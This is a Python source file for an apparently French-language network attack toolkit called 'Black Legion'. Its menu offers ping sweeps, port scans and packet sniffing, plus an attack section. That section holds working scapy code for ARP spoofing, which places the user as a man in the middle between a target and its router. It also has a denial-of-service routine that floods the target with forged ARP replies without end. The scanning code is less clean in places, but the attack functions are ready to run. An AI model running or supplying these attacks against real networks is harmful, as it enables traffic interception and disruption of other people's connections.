import socket, os, time, threading, colorama, ssl
import scapy.all as scapy
from colorama import Fore
from datetime import datetime
from socket import*

print_lock = threading.Lock()

colorama.init()
def main():
	os.system('cls')
	print(Fore.BLUE+"\n"
			   +"  ____    _                  _        _                       _                 \n"
	           +" |  _ \  | |                | |      | |                     (_)                \n"
	           +" | |_) | | |   __ _    ___  | | __   | |        ___    __ _   _    ___    _ __  \n"
	           +" |  _ <  | |  / _` |  / __| | |/ /   | |       / _ \  / _` | | |  / _ \  | '_ \ \n"
	           +" | |_) | | | | (_| | | (__  |   <    | |____  |  __/ | (_| | | | | (_) | | | | |\n"
	           +" |____/  |_|  \__,_|  \___| |_|\_\   |______|  \___|  \__, | |_|  \___/  |_| |_|\n"
	           +"                                                       __/ |                    \n"
	           +"                                                      |___/                     "+Fore.RESET+Fore.GREEN)
	n = input(           " 1- Scan\n"
			  			 " 2- Attaque\n"
			  			 " 3- \n"
			  			 " Other- Return To Previous Menu\n\n"
			  			 " >: ")
	if n == "1":
		scan()

	elif n == "2":
		attaque()

	elif n == "3":
		pass

	else:
		main()




















def scan():
	print(Fore.MAGENTA +"   _____                         \n"
		  			   +"  / ____|                        \n"
		  			   +" | (___     ___    __ _   _ __   \n"
		  			   +"  \___ \   / __|  / _` | | '_ \  \n"
		  			   +"  ____) | | (__  | (_| | | | | | \n"
		  			   +" |_____/   \___|  \__,_| |_| |_| \n" + Fore.RESET + Fore.GREEN)


	scn = input(		 " 1- Balayage De Ping (Very-Low)\n"
						 " 2- Scanner De Port (Low)\n"
						 " 3- Scanner TCP Pour Les Systèmes Windows (Fast)\n"
						 " 4- Scanner De Port filetés /!/Beta not stable/!/ (Fast)\n"
						 " 5- Écouter le réseau pour les RI\n"
						 " Other- Return To Previous Menu\n\n"
						 " >: ")


	if scn == "1":
		balayage()

	elif scn == "2":
		scanner()

	elif scn == "3":
		scanner_TCP()

	elif scn == "4":
		portfilter()

	elif scn == "5":
		ecoscan()

	else:
		main()





def balayage():
	ip = input(" IP address >: ")
	t1 = datetime.now()
	ip = ip.split('.')
	plage = ip[0] + '.' + ip[1] + '.' + ip[2] + '.'

	for ip in range(0,255):
		response = os.popen("ping -n 1 " + plage + str(ip))

		for line in response.readlines():
			if (line.count("TTL")):
				print(" " + plage + str(ip), "--> Live")

			if(line.count("TTL")):
				break

	t2 = datetime.now()
	total = t2 - t1
	print(" Fin de l'exécution " + str(total))





def scanner():
	ip_target = input(" IP address >: ")
	t1 = datetime.now()
	print("[", end="")

	for port in range(0, 1024):
		s = socket(AF_INET, SOCK_STREAM)
		conn = s.connect_ex((ip_target, port))
		print(Fore.GREEN + "*", end="")

		if(conn == 0) :
			print(' Port %d: OPEN' % (port,))

	s.close()
	print("]")

	t2 = datetime.now()
	total = t2 - t1
	print(" Fin de l'exécution " + str(total))




def scanner_TCP():
	a = 5
	ip1 = input(" IP address >: ")
	t1 = datetime.now()
	ip1 = ip1.split('.')
	tableau = str("")
	plage = ip1[0] + '.' + ip1[1] + '.' + ip1[2] + '.'

	for ip in range(0,255):
		addr = plage + str(ip)

		if (TCP_scan(addr)):
			tableau = tableau + " | " + addr
			if ip == a:
				a = a + 5
				tableau = tableau + "\n"

	print(Fore.GREEN + tableau)
	t2 = datetime.now()
	total = t2 - t1
	print(" Fin de l'exécution " + str(total))

def TCP_scan(addr):
	s = socket(AF_INET, SOCK_STREAM)
	result = s.connect_ex((addr,135))
	if result == 0:
		return 1
	else:
		return 0


def portfilter():
	ip = input(" IP address >: ")
	print("[", end="")

	for port in range(0, 1024):
		print(Fore.GREEN + "*", end="")
		s = socket(AF_INET, SOCK_STREAM)

		try:
			con = s.connect((ip, port))
			with print_lock:
				print(port, 'Est Actif')
			con.close()
		except:
			pass
	print("]")


def ecoscan():
	ip_target = input(" IP address filtre >: ")
	filtre = 'host '+ ip_target
	snf = scapy.sniff(count=5, filter=filtre and "FTP" and "port 80" and "port 8080", prn=lambda x:x.show())






















def attaque():
	print(Fore.RED+ "             _     _                    _     \n"
				  + "     /\     | |   | |                  | |    \n"
				  + "    /  \    | |_  | |_    __ _    ___  | | __ \n"
				  + "   / /\ \   | __| | __|  / _` |  / __| | |/ / \n"
				  + "  / ____ \  | |_  | |_  | (_| | | (__  |   <  \n"
				  + " /_/    \_\  \__|  \__|  \__,_|  \___| |_|\_\ \n"  
				  + "\n" + Fore.RESET + Fore.GREEN)


	f = input(		" 1- Man In The Middle (MITM)/!/Attention Attaque DOS/!/\n"
					" 2- DOS\n"
					" Other- Return To Previous Menu\n\n"
					" >: ")

	if f == "1":
		maninthemidle()

	elif f == "2":
		ddos()

	else:
		main()



 
def maninthemidle():

	target_ip = input(" Address IP de la cible : ")
	router_ip = input(" Address IP du router : ")
	target_mac = str(get_mac(target_ip))
	router_mac = str(get_mac(router_ip))

	try:
		while True:
			spoof(router_ip, target_ip, router_mac, target_mac)
			time.sleep(10)
	except KeyboardInterrupt:
		print('Closing ARP Spoofer.')
		exit(0)

def get_mac(ip):
	mac = "xx"
	while mac == "xx":
		try:
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
			mac = answered_list[0][1].hwsrc 
		except:
			pass
		finally:
			return mac

def spoof(router_ip, target_ip, router_mac, target_mac):

	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

	try:
		scapy.send(packet1)
	except:
		print(Fore.RED + "l'address IP du rooter ne marche pas" + Fore.GREEN)

	try:
		scapy.send(packet2)
	except:
		print(Fore.RED + "l'address IP de la cible ne marche pas" + Fore.GREEN)



def ddos():
	target_ip = input(" Address IP de la cible : ")
	router_ip = input(" Address IP du router : ")
	target_mac = str(get_mac(target_ip))
	t = True


	try:
		while t:
			packet1 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
			scapy.send(packet1)
			
	except KeyboardInterrupt:
		print(' Closing.')
		exit(0)


if __name__ == "__main__":
	main()
